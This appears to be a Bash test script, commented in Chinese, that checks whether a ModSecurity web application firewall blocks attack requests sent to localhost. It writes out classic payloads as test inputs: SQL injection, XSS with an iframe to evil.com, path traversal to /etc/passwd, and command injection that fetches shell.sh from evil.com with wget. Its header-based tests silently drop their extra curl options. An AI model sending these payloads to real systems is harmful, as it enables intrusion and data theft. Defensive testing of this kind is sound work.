#!/bin/bash
# WAF测试脚本
# 版本: 1.0.0
# 日期: 2026-02-15
# 用途: 测试WAF防护功能

set -e

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# 测试目标
TARGET="${TARGET:-http://localhost}"
HTTPS_TARGET="${HTTPS_TARGET:-https://localhost}"

# 统计
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0

echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  WAF功能测试脚本${NC}"
echo -e "${BLUE}  版本: 1.0.0${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""
echo -e "测试目标: $TARGET"
echo ""

# 测试函数
test_case() {
    local name="$1"
    local url="$2"
    local expected_code="$3"
    local description="$4"
    
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    
    echo -e "${YELLOW}测试 #$TOTAL_TESTS: $name${NC}"
    echo -e "描述: $description"
    echo -e "URL: $url"
    echo -e "期望状态码: $expected_code"
    
    # 执行请求
    response_code=$(curl -k -s -o /dev/null -w "%{http_code}" "$url" 2>&1 || echo "000")
    
    echo -e "实际状态码: $response_code"
    
    # 验证结果
    if [ "$response_code" = "$expected_code" ]; then
        echo -e "${GREEN}✅ 通过${NC}"
        PASSED_TESTS=$((PASSED_TESTS + 1))
    else
        echo -e "${RED}❌ 失败${NC}"
        FAILED_TESTS=$((FAILED_TESTS + 1))
    fi
    echo ""
}

# ============ 基础功能测试 ============
echo -e "${BLUE}[1] 基础功能测试${NC}"
echo ""

test_case \
    "健康检查" \
    "$TARGET/health" \
    "200" \
    "测试WAF基本可用性"

test_case \
    "HTTP到HTTPS重定向" \
    "$TARGET/" \
    "301" \
    "测试HTTP强制跳转到HTTPS"

test_case \
    "正常页面访问" \
    "$HTTPS_TARGET/" \
    "200" \
    "测试正常请求不被拦截"

# ============ SQL注入防护测试 ============
echo -e "${BLUE}[2] SQL注入防护测试${NC}"
echo ""

test_case \
    "SQL注入 - Union Select" \
    "$TARGET/api/v1/users?id=1' UNION SELECT * FROM users--" \
    "403" \
    "测试WAF拦截SQL注入攻击（UNION SELECT）"

test_case \
    "SQL注入 - OR条件" \
    "$TARGET/api/v1/users?id=1' OR '1'='1" \
    "403" \
    "测试WAF拦截SQL注入攻击（OR条件）"

test_case \
    "SQL注入 - Drop Table" \
    "$TARGET/api/v1/search?q=test'; DROP TABLE users;--" \
    "403" \
    "测试WAF拦截SQL注入攻击（DROP TABLE）"

test_case \
    "SQL注入 - Encoded" \
    "$TARGET/api/v1/users?id=1%27%20OR%20%271%27%3D%271" \
    "403" \
    "测试WAF拦截编码的SQL注入"

# ============ XSS防护测试 ============
echo -e "${BLUE}[3] XSS防护测试${NC}"
echo ""

test_case \
    "XSS - Script标签" \
    "$TARGET/api/v1/search?q=<script>alert('XSS')</script>" \
    "403" \
    "测试WAF拦截XSS攻击（script标签）"

test_case \
    "XSS - 事件处理器" \
    "$TARGET/api/v1/search?q=<img src=x onerror=alert(1)>" \
    "403" \
    "测试WAF拦截XSS攻击（onerror事件）"

test_case \
    "XSS - JavaScript协议" \
    "$TARGET/api/v1/search?q=<a href='javascript:alert(1)'>click</a>" \
    "403" \
    "测试WAF拦截XSS攻击（javascript协议）"

test_case \
    "XSS - Iframe注入" \
    "$TARGET/api/v1/search?q=<iframe src='http://evil.com'></iframe>" \
    "403" \
    "测试WAF拦截XSS攻击（iframe注入）"

# ============ 路径穿越防护测试 ============
echo -e "${BLUE}[4] 路径穿越防护测试${NC}"
echo ""

test_case \
    "路径穿越 - Unix" \
    "$TARGET/api/v1/../../etc/passwd" \
    "403" \
    "测试WAF拦截路径穿越攻击（Unix风格）"

test_case \
    "路径穿越 - Windows" \
    "$TARGET/api/v1/..\\..\\windows\\system32\\config\\sam" \
    "403" \
    "测试WAF拦截路径穿越攻击（Windows风格）"

test_case \
    "路径穿越 - URL编码" \
    "$TARGET/api/v1/%2e%2e%2f%2e%2e%2fetc%2fpasswd" \
    "403" \
    "测试WAF拦截编码的路径穿越"

# ============ 敏感文件访问防护测试 ============
echo -e "${BLUE}[5] 敏感文件访问防护测试${NC}"
echo ""

test_case \
    "敏感文件 - .env" \
    "$TARGET/.env" \
    "404" \
    "测试WAF拦截.env文件访问"

test_case \
    "敏感文件 - .git" \
    "$TARGET/.git/config" \
    "404" \
    "测试WAF拦截.git文件访问"

test_case \
    "敏感文件 - .htaccess" \
    "$TARGET/.htaccess" \
    "404" \
    "测试WAF拦截.htaccess文件访问"

test_case \
    "敏感文件 - backup" \
    "$TARGET/database.sql.bak" \
    "404" \
    "测试WAF拦截备份文件访问"

# ============ 命令注入防护测试 ============
echo -e "${BLUE}[6] 命令注入防护测试${NC}"
echo ""

test_case \
    "命令注入 - ls命令" \
    "$TARGET/api/v1/search?q=test; ls -la" \
    "403" \
    "测试WAF拦截命令注入（ls）"

test_case \
    "命令注入 - cat命令" \
    "$TARGET/api/v1/search?q=\$(cat /etc/passwd)" \
    "403" \
    "测试WAF拦截命令注入（cat）"

test_case \
    "命令注入 - wget" \
    "$TARGET/api/v1/search?q=test | wget http://evil.com/shell.sh" \
    "403" \
    "测试WAF拦截命令注入（wget）"

# ============ 恶意扫描器检测测试 ============
echo -e "${BLUE}[7] 恶意扫描器检测测试${NC}"
echo ""

test_case \
    "扫描器检测 - sqlmap" \
    "$TARGET/" \
    "403" \
    "测试WAF拦截sqlmap扫描器" \
    "-H 'User-Agent: sqlmap/1.0'"

test_case \
    "扫描器检测 - nikto" \
    "$TARGET/" \
    "403" \
    "测试WAF拦截nikto扫描器" \
    "-H 'User-Agent: nikto/2.1.6'"

# ============ 速率限制测试 ============
echo -e "${BLUE}[8] 速率限制测试${NC}"
echo ""

echo -e "${YELLOW}测试 #$((TOTAL_TESTS + 1)): API速率限制${NC}"
echo -e "描述: 测试API速率限制功能"
echo -e "方法: 短时间内发送大量请求"

TOTAL_TESTS=$((TOTAL_TESTS + 1))

rate_limit_triggered=false
for i in {1..110}; do
    response_code=$(curl -k -s -o /dev/null -w "%{http_code}" "$TARGET/api/health" 2>&1 || echo "000")
    if [ "$response_code" = "429" ]; then
        rate_limit_triggered=true
        break
    fi
    sleep 0.01
done

if [ "$rate_limit_triggered" = true ]; then
    echo -e "${GREEN}✅ 通过 - 速率限制已触发（429 Too Many Requests）${NC}"
    PASSED_TESTS=$((PASSED_TESTS + 1))
else
    echo -e "${RED}❌ 失败 - 速率限制未触发${NC}"
    FAILED_TESTS=$((FAILED_TESTS + 1))
fi
echo ""

# ============ 协议异常测试 ============
echo -e "${BLUE}[9] 协议异常测试${NC}"
echo ""

test_case \
    "非标准请求方法" \
    "$TARGET/" \
    "405" \
    "测试非标准HTTP方法被拒绝" \
    "-X TRACE"

# ============ SSRF防护测试 ============
echo -e "${BLUE}[10] SSRF防护测试${NC}"
echo ""

test_case \
    "SSRF - localhost" \
    "$TARGET/api/v1/fetch?url=http://localhost/admin" \
    "403" \
    "测试WAF拦截SSRF攻击（localhost）"

test_case \
    "SSRF - file协议" \
    "$TARGET/api/v1/fetch?url=file:///etc/passwd" \
    "403" \
    "测试WAF拦截SSRF攻击（file协议）"

# ============ 测试总结 ============
echo ""
echo -e "${BLUE}========================================${NC}"
echo -e "${BLUE}  测试总结${NC}"
echo -e "${BLUE}========================================${NC}"
echo ""
echo -e "总测试数: ${BLUE}$TOTAL_TESTS${NC}"
echo -e "通过: ${GREEN}$PASSED_TESTS${NC}"
echo -e "失败: ${RED}$FAILED_TESTS${NC}"
echo ""

if [ $FAILED_TESTS -eq 0 ]; then
    echo -e "${GREEN}🎉 所有测试通过！WAF配置正确。${NC}"
    exit 0
else
    pass_rate=$((PASSED_TESTS * 100 / TOTAL_TESTS))
    echo -e "${YELLOW}⚠️  部分测试失败，通过率: ${pass_rate}%${NC}"
    echo ""
    echo -e "建议操作:"
    echo -e "  1. 检查WAF日志: docker-compose -f docker-compose.waf.yml logs nginx-waf"
    echo -e "  2. 检查ModSecurity审计日志: tail -f logs/nginx/modsec_audit.log"
    echo -e "  3. 调整WAF规则: 编辑 docker/nginx/modsecurity/custom-rules.conf"
    echo -e "  4. 重新加载配置: docker-compose -f docker-compose.waf.yml restart nginx-waf"
    exit 1
fi
